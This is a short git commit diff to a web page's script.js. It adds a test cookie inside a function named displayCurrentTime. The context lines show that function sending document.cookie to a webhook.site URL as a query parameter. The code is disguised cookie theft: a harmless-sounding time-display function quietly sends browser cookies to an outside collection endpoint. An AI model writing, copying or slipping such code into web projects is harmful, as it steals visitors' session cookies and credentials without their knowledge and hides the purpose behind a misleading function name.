b0dcb76fc6b9c7b4355f758863905c8a7e348ea2
miracul9228 <134514965+miracul9228@users.noreply.github.com>
2025-04-23 22:05:42 +0800

    Update script.js

--- script.js
+++ script.js
@@ -5,6 +5,7 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   function displayCurrentTime() {
+    document.cookie = "username=testUser; path=/";  // 手動設 cookie
     const url = "https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?" + new URLSearchParams({
       cookie: document.cookie
     });
